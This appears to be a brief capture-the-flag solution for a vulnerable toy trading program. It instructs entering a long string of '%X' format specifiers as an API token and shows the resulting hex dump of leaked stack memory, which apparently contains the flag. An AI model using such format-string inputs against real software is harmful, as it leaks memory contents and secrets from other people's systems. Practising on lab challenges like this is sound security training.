Type in 1
Then type in loooots of %X%X%X%X%X !!!
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X
Buying stonks with token:
8856390804B00080489C3F7EE6D80FFFFFFFF18854160F7EF4110F7EE6DC7088551803885637088563906F6369707B465443306C5F49345F74356D5F6C6C306D5F795F79336E3266633130613130FFB6007DF7F21AF8F7EF444093041C0010F7D83CE9F7EF50C0F7EE65C0
Portfolio as of Wed Mar 16 13:00:33 UTC 2022


3 shares of MI
1 shares of KPF
5 shares of LY
25 shares of REC
1346 shares of CLX
Goodbye!
